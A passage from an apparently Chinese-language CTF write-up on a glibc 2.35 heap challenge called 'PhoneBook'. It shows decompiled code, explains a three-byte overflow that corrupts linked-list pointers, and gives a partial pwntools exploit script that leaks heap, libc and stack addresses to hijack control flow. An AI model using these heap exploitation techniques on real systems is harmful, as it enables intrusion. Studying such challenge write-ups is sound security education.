  v1 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v2 <span class="token operator">=</span> chunklist<span class="token punctuation">;</span>
    ptr <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      ptr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">==</span> v1 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Delete success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> v4 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can not delete it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v4 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v1 <span class="token operator">=</span> chunklist<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%-8s%-16s%s\n"</span><span class="token punctuation">,</span> <span class="token string">"Index"</span><span class="token punctuation">,</span> <span class="token string">"Name"</span><span class="token punctuation">,</span> <span class="token string">"Phone-Number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%-8lu%-16s%s\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Show success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v2 <span class="token operator">=</span> chunklist<span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">==</span> v1 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"New Name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"New Phone Number?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xBu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Edit success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> v4 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index not found!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can not edit it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v4 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过分析程序逻辑，发现增删改查操作都涉及到间接寻址，可以发现是一个单链表的结构，尾插入法，头结点是不做操作的，结构体大概是这样，漏洞出现在 修改phone_number的时候有一个三字节的溢出可以破坏单链表的指针，由于main arena基地址有效位实际上是低十二位，这里破坏next chunk只能两个字节的改，所以12 - 16位也就是 0 - f 这个需要爆破一下，本地调试的话这种情况吧aslr关掉，保证利用链能打通的情况下再去写爆破的逻辑就好了。然后大多数操作都有idx的检查，所以在破坏next chunk指针的同时，还需要考虑一下idx的情况</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">chunk</span><span class="token punctuation">&#123;</span>
int64 chunk_idx<span class="token punctuation">;</span>
<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> phone_number<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>next_chunk<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先得拿到一些劫持控制流常用的原语，比如说任意地址读写 glibc是2.35 tcache poison 和fastbin attack需要绕过safe link得泄露堆地址，libc地址也需要泄露。 泄露堆地址吧 phone_number填满然后show 通过 %s就能泄露，泄露libc地址的话，需要布置堆风水，伪造8个fake chunk，chunk_size &gt; 0x80 prev inuse &#x3D; 1,<br>可以布置这样一个堆布局</p>
<pre class="line-numbers language-none"><code class="language-none">head_node -&gt; nodeA -&gt; nodeB -&gt; nodeC -&gt; nodeD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>通过edit nodeA，写fake chunk，然后将 nodeC 的 next chunk指低两个字节指向 fake chunk的 udata部分 之后delete node就能得到一个 伪造出来的bin了，填满tcache后就能拿到unsortedbin<br>拿到unsortedbin 后泄露environ的地址，然后把main函数栈帧的返回地址改了就能劫持控制流<br>用这个gadget配合binsh 和system就好了</p>
<pre class="line-numbers language-none"><code class="language-none">0x0000000000125bb0 : pop rax ; pop rdi ; call rax<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./PhoneBook'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phonenumber<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Your Choice: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"Name?"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"Phone Number?"</span><span class="token punctuation">,</span>phonenumber<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Your Choice: "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"Index?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>phonenumber<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Your Choice: "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"Index?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"New Name?"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"New Phone Number?"</span><span class="token punctuation">,</span>phonenumber<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Your Choice: \n'</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x39</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

pl <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span>
pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x3d</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x330</span>


edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># reset 2</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0xc2e0</span><span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">56</span><span class="token operator">-</span>i<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0x39</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    
<span class="token comment"># 截断结尾 unsortedbin 的下一个chunk</span>
edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xc290</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

show<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> u64<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>

libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7facce0</span> <span class="token operator">-</span> <span class="token number">0x7ffff7d93000</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>


environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>
environ_low <span class="token operator">=</span> environ <span class="token operator">&amp;</span> <span class="token number">0xffffff</span>
byte1 <span class="token operator">=</span> <span class="token punctuation">(</span>environ_low <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment"># 获取低字节</span>
byte2 <span class="token operator">=</span> <span class="token punctuation">(</span>environ_low <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>   <span class="token comment"># 获取中间字节</span>
byte3 <span class="token operator">=</span> environ_low <span class="token operator">&amp;</span> <span class="token number">0xff</span>          <span class="token comment"># 获取高字节</span>

edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>byte3<span class="token punctuation">,</span> byte2<span class="token punctuation">,</span> byte1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xc410</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fffffffdc48</span><span class="token operator">-</span><span class="token number">0x7fffffffdd88</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">8</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'stack_addr -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xc420</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># reset 7</span>

